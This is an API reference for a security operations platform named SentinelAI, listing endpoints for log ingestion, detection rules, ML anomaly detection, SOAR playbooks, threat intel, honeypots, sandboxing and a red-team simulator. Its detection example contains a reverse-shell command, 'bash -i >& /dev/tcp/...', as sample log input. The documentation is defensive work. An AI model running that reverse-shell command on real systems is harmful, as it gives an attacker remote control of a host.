# SentinelAI — Complete API Reference

**Base URL:** `http://localhost:8000` (via Nginx gateway)  
**Auth:** All endpoints (except `/auth/login`, `/auth/register`) require `Authorization: Bearer <JWT>`

---

## Auth Service — Port 8001

### POST /auth/register
Create a new user account.
```json
{ "username":"analyst1","email":"a@corp.com","password":"StrongPass!1","role":"analyst","full_name":"John Doe" }
```
**Response:** `{ "message": "User created successfully", "user_id": "abc123" }`

### POST /auth/login
Login and receive JWT tokens.
```json
{ "username":"analyst1","password":"StrongPass!1","mfa_token":"123456" }
```
**Response:**
```json
{
  "access_token":"eyJ...",
  "refresh_token":"eyJ...",
  "token_type":"bearer",
  "expires_in":1800,
  "user":{"id":"...","username":"analyst1","role":"analyst","mfa_enabled":true}
}
```

### POST /auth/refresh
Refresh access token.
```json
{ "refresh_token": "eyJ..." }
```

### POST /auth/logout
Revoke session (requires Bearer token).

### POST /auth/mfa/setup
Get MFA QR code for TOTP setup. Returns `secret`, `qr_code_base64`, `provisioning_uri`.

### POST /auth/mfa/enable?token=123456
Enable MFA after verifying TOTP code.

### GET /auth/me
Get current user profile + permissions.

### GET /auth/users
*(admin only)* List all platform users.

### GET /auth/oauth2/providers
List configured OAuth2 SSO providers (Google, GitHub, Microsoft).

### GET /auth/oauth2/{provider}/login
Redirect to OAuth2 provider for social login.

---

## Log Service — Port 8002

### POST /logs/ingest
Ingest a single log event. Non-blocking (202 Accepted).
```json
{
  "source_ip":"10.0.1.50",
  "hostname":"server-A",
  "log_source":"syslog",
  "event_type":"failed_login",
  "severity":"medium",
  "raw_log":"Failed password for root from 10.0.1.50...",
  "parsed":{"username":"root"},
  "agent_id":"agent-001",
  "os_type":"linux"
}
```

### POST /logs/bulk
Bulk ingest up to 10,000 events. Body: `{ "events": [...] }`

### POST /logs/search
Full-text + structured OpenSearch query.
```json
{ "query":"failed_login","size":100,"from":0,"time_from":"now-1h","time_to":"now" }
```

### GET /logs/recent?size=50&severity=high
Fetch most recent log events, optionally filtered by severity.

### GET /logs/stats
Aggregations: by severity, by source, by hour.

---

## Detection Engine — Port 8003

### POST /detect
Run detection rules against a single log event manually.
```json
{ "log_event": { "raw_log":"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1","source_ip":"10.0.0.1"} }
```
**Response:** `{ "alerts": [...], "count": 1 }`

### GET /alerts/recent?size=50&severity=critical
Fetch recent security alerts from OpenSearch.

### GET /alerts/stats
Aggregations by severity, detection type, MITRE technique.

### GET /rules
List all 12 Sigma detection rules with metadata.

### GET /correlation/chains
List all 4 defined attack chain patterns.

---

## AI Service — Port 8004

### POST /ai/analyze-alert
LLM-powered alert explanation. Returns structured markdown analysis.
```json
{ "alert": { ...alert object... } }
```

### POST /ai/anomaly-detect
Isolation Forest anomaly detection.
```json
{ "features": [50.0,10.0,14.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0], "source_ip": "10.0.1.5" }
```
**Response:** `{ "is_anomaly": false, "anomaly_score": -0.15, "risk_level": "low" }`

### POST /ai/ensemble-anomaly
Ensemble: IsolationForest + Autoencoder + One-Class SVM majority vote.
Same input as `/ai/anomaly-detect`.
**Response:** `{ "is_anomaly": true, "confidence": 0.67, "votes": {"isolation_forest":true,"autoencoder":true,"ocsvm":false} }`

### POST /ai/classify-attack
XGBoost + RandomForest ensemble attack classification.
```json
{ "features": [...10 floats...], "source_ip": "1.2.3.4", "raw_log": "..." }
```
**Response:** `{ "attack_class": "brute_force", "confidence": 0.94 }`

### POST /ai/dnn-classify
Deep Neural Network (3-layer) attack classification. Same input format.

### POST /ai/threat-hunt
AI threat hunting assistant.
```json
{ "query": "Find suspicious PowerShell activity", "time_range_hours": 24 }
```

### POST /ai/generate-report
Generate AI incident report.
```json
{ "incident_ids": ["alert-id-1","alert-id-2"], "report_type": "executive" }
```

### POST /ai/predict-threat
Predict likelihood of future attack stages.
```json
{ "ip": "185.220.101.45", "recent_events": [{"detection_type":"port_scan"}, {"detection_type":"brute_force"}] }
```

### POST /ai/generate/sigma-rule *(NEW)*
Generate a Sigma detection rule using LLM.
```json
{ "threat_description": "Attacker uses certutil.exe to download malware", "mitre_technique": "T1105", "log_source": "windows" }
```

### POST /ai/generate/yara-rule *(NEW)*
Generate a YARA malware detection rule using LLM.
```json
{ "threat_description": "Ransomware encrypts files and drops ransom note", "malware_family": "LockBit", "platform": "windows" }
```

### GET /ai/stats
AI model status, training state, available models.

---

## SOAR Service — Port 8005

### POST /soar/execute/{playbook_name}
Manually trigger a SOAR playbook with an alert payload.
Playbooks: `brute_force`, `malware_execution`, `phishing`, `ddos`, `data_exfiltration`, `privilege_escalation`
```json
{ ...alert object... }
```

### GET /soar/executions?limit=50
List recent SOAR playbook execution history.

### GET /soar/tickets
List all open incident tickets.

### PUT /soar/tickets/{ticket_id}/status?status=resolved
Update ticket status: `open | in_progress | resolved | closed`

### GET /soar/playbooks
List all available playbooks with descriptions.

---

## Threat Intel Service — Port 8006

### GET /intel/ip/{ip}
Enrich IP: VirusTotal + AbuseIPDB + AlienVault OTX.

### GET /intel/ip/full/{ip} *(NEW)*
Full enrichment: VirusTotal + AbuseIPDB + OTX + **Shodan** + **MISP** + **OpenCTI**.

### GET /intel/hash/{sha256}
VirusTotal file hash lookup.

### GET /intel/domain/{domain}
Domain reputation from VirusTotal + OTX.

### GET /intel/cve/{cve_id}
CVE details from NVD (e.g. `CVE-2021-44228`).

### POST /intel/bulk
Bulk IOC enrichment. Body: `{ "iocs": [{"ioc":"1.2.3.4","ioc_type":"ip"}, ...] }`

### GET /intel/misp/search?ioc=1.2.3.4&ioc_type=ip-dst *(NEW)*
Search MISP threat sharing platform.

### GET /intel/opencti/search?value=1.2.3.4 *(NEW)*
Search OpenCTI threat intelligence platform.

### GET /intel/shodan/{ip} *(NEW)*
Shodan host intelligence (open ports, vulns, ISP, geolocation).

### GET /intel/feed/malicious-ips
Return cached malicious IPs with VT score > 2.

---

## Alert Service — Port 8007

### WS /ws/alerts
WebSocket for real-time alert delivery.  
On connect: sends last 20 alerts as `{type:"history", data:{...}}` messages.  
Live: `{type:"alert", data:{...}}` for each new alert.  
Keepalive: `{type:"ping", ts:"..."}` every 30s.

### GET /alerts/timeline?limit=100&offset=0
Alert timeline from Redis sorted set.

### GET /alerts/count-by-severity
`{ "critical": 12, "high": 45, "medium": 103, "low": 74 }`

### GET /alerts/{alert_id}/acknowledge?analyst=john
Mark alert as acknowledged. Broadcasts ack event to all WS clients.

---

## Report Service — Port 8008

### POST /reports/pdf
Generate and download a PDF security report.
```json
{ "report_type": "executive", "time_range_h": 24, "prepared_by": "SOC Team" }
```
**Response:** PDF binary (Content-Disposition: attachment)

### POST /reports/json
Structured JSON report for programmatic use.

### GET /reports/stats?hours=24
Platform statistics: total alerts, by severity, by type, by technique.

---

## VPN Monitor Service — Port 8009

### POST /vpn/session
Report a VPN connect/disconnect event with geo-enrichment.
```json
{ "username":"jdoe","peer_ip":"185.100.50.1","vpn_ip":"10.100.0.5","protocol":"wireguard","event":"connect" }
```

### GET /vpn/sessions?limit=100
Recent VPN session events with geo data.

### GET /vpn/active
All currently active VPN users and their IPs.

### GET /vpn/stats
VPN usage statistics: sessions by country, active users.

---

## Honeypot Service — Port 8010

### POST /honeypot/report
Manually report a honeypot hit from external tools (Cowrie/Dionaea).

### POST /honeypot/command
Log an attacker command from shell session.

### GET /honeypot/log?limit=100
Recent honeypot interaction log.

### GET /honeypot/top-attackers
Top attacking IPs sorted by hit count.

**Live TCP traps:**  
- SSH honeypot: port `2222`  
- FTP honeypot: port `2121`  
- HTTP fake admin: `/admin`, `/wp-admin`, `/phpmyadmin`, `/.env`

---

## Sandbox Service — Port 8011

### POST /sandbox/analyze
Upload and analyze a suspicious file (multipart/form-data).
- YARA scanning
- Entropy analysis
- PE header analysis
- VirusTotal hash lookup
- Threat score 0–100

### POST /sandbox/hash
Look up a known hash: `{ "file_hash": "sha256_or_md5_here" }`

### GET /sandbox/results?limit=50
List recent sandbox analysis results.

### GET /sandbox/stats
Detection rate, total analyzed, malicious count.

---

## Cloud Security — Port 8012

### POST /cloud/scan
Run CIS Benchmark scan against cloud account.
```json
{ "provider": "aws", "account_id": "123456789", "region": "us-east-1" }
```
**Response:** Posture score (0–100), grade (A–F), all check results.

### POST /cloud/event
Ingest and analyze a cloud API event (CloudTrail/Azure Monitor).
```json
{ "provider":"aws","event_type":"api_call","account_id":"123","region":"us-east-1","user":"arn:aws:...","action":"DeleteTrail","source_ip":"1.2.3.4","raw_event":{} }
```

### GET /cloud/events/suspicious
List all monitored suspicious cloud API actions with MITRE mapping.

### GET /cloud/scan/history
Historical posture scan results.

---

## Red Team Simulator — Port 8013

### GET /redteam/scenarios
List all 10 available attack scenarios.

### POST /redteam/simulate
Run an attack simulation.
```json
{ "scenario":"brute_force_ssh","attacker_ip":"185.1.2.3","target_host":"server-A-1","dry_run":false,"delay_ms":100 }
```
Scenarios: `brute_force_ssh`, `reverse_shell`, `port_scan`, `dns_tunneling`, `privilege_escalation`, `lateral_movement`, `data_exfiltration`, `ransomware`, `phishing_simulation`, `credential_dump`, `full_attack_chain`

### POST /redteam/phishing
Generate a simulated phishing email for security awareness.
```json
{ "target_email":"user@corp.com","sender_domain":"corp-secure.net","lure_type":"vpn_credentials" }
```

### POST /redteam/validate-detection?scenario=brute_force_ssh
Run scenario and verify detection engine triggers correctly.

### GET /redteam/history?limit=50
History of simulation runs.

---

## Multi-Agent Orchestrator — Port 8014

### POST /orchestrate
Dispatch all 6 AI agents against an alert (parallel Phase 1, sequential Phase 2).
```json
{ "alert": {...alert object...}, "agents": null, "async_mode": true }
```
**Response:** `{ "status": "queued", "session_id": "abc123" }`

### GET /orchestrate/result/{session_id}
Get orchestration session result with all agent outputs.

### POST /agents/{agent_name}/run
Run a single agent directly:  
`detection_agent | threat_intel_agent | malware_agent | incident_report_agent | response_agent | hunting_agent`

### GET /agents/status
All 6 agent states: idle/running/completed/failed + task counts.

### POST /agents/hunt
Autonomous threat hunt: `{ "hypothesis": "Find C2 beaconing", "time_range_h": 24 }`

### WS /ws/agents
WebSocket for real-time agent status updates (every 10s).

---

## Go Metrics Service — Port 8015

### GET /metrics
JSON platform counters: total alerts, by severity, logs ingested, SOAR executions, etc.

### GET /metrics/prometheus
Prometheus text format — scraped by Prometheus at `/metrics/prometheus`.

### GET /metrics/timeseries?metric=alerts&n=60
Time-series data: `alerts | logs | cpu` for the last N data points.

### POST /metrics/ingest
Record a metric event:
```json
{ "event_type": "alert", "severity": "critical", "count": 1 }
```
Event types: `alert | log | soar_execute | soar_fail | honeypot | vpn_connect | sandbox_analyzed | malicious_file | attack_chain | threat_intel | impossible_travel`

### GET /metrics/stream
Server-Sent Events stream — updates every 3 seconds. Use in dashboard for live counters.
